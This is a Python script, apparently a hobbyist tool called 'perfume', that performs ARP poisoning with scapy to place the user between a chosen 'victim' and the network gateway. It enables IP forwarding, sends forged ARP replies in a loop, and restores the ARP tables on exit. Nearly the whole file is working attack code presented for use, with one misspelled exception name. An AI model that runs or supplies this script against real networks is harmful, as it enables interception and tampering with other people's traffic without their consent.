from scapy.all import *
import sys
import time
import os

# usage " python perfume.py "

## THIS TOOL IS CREATED BY WHOAMIANOOB !

# INTRO !!
def banner():
 print("\033[0;32m @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
 print("\033[0;32m @@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@")
 print("\033[0;32m @@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@")
 print("\033[0;32m @@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@")
 print("\033[0;32m @@@@@@@    @@@@@@@@@     @@@@@@@@@@@    @@@@@@@")
 print("\033[0;32m @@@@@@@    @@@@@@@@@     @@@@@@@@@@@    @@@@@@@")
 print("\033[0;32m @@@@@@@                                 @@@@@@@")
 print("\033[0;32m @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
 print("\033[0;32m @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
 print("\033[0;34m -----------------------------------------------")
 print("\033[0;31m       *-* PERFUME BY WHOAMIANOOB *-*           ")

time.sleep(2)
os.system("clear")
banner()

# GETTING REQUIRED INPUTS FROM USER !!


try:
   os.system("iwconfig")
   print("+++++++++++++++++++++++++++++++++++++++++++++++++")
   interface = raw_input("[*] ENTER THE INTERFACE TO WORK WITH [:> ")
   print("+++++++++++++++++++++++++++++++++++++++++++++++++")
   os.system("arp-scan -l | grep 192")
   victimip = raw_input("[*] ENTER THE VICTIMS IP [:> ")
   print("+++++++++++++++++++++++++++++++++++++++++++++++++")
   gateip = raw_input("[*] ENTER THE GATEWAY/ROUTER IP [:> ")
except Keyboardinterrupt:
   print("[*] SHUTTING DOWN [pid : perfume] ......")
   sys.exit(1)

# IP-FORWARDING !!
print("[*] ENABLING IP FORWARDING....")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# GETTING MAC-ADDRESSES !!

def get_mac(IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout =  2, iface = interface, inter = 0.1)
        for snd,rcv in ans:
                return rcv.sprintf(r"%Ether.src%")

# RE-ARPING TARGETS !!

def reARP():

        print("[*] RESTORING TARGETS....")
        victimMAC = get_mac(victimip)
        gateMAC = get_mac(gateip)
        send(ARP(op = 2, pdst = gateip, psrc = victimip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
        send(ARP(op =2, pdst = victimip, psrc = gateip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
        print("[*] KILLING IP FORWARDING.....")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] SHUTTING DOWN ...")
        sys.exit(1)

## CONFUSING THE TARGET !!

def confuse(gm, vm):
          send(ARP(op = 2, pdst = victimip, psrc = gateip, hwdst = vm))
          send(ARP(op = 2, pdst = gateip, psrc = victimip, hwdst = gm))

## NOW THE MAIN PART :: MITM

def mitm():
        try:
               victimMAC = get_mac(victimip)
        except Exception:
               os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
               print("[*] COULD NOT FIND VICTIMS MAC ADDRESS !!")
               print("[*] EXITING ...")
               sys.exit(1)

        try:
               gateMAC = get_mac(gateip)
        except Exception:
               os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
               print("[*] COULD NOT FIND GATEWAY MAC ADDRESS !!")
               print("[*] EXITING ...")
               sys.exit(1)

        print("[*] ISNT THE PERFUME OF ARP-POISON SOOTHING ??")
        print("[*] POISONING TARGETS...")
        print("                                        ctrl+c to stop !!")
        while 1:
                try:
                      confuse(gateMAC, victimMAC)
                      time.sleep(1.5)
                except KeyboardInterrupt:
                      reARP()
                      break
mitm()
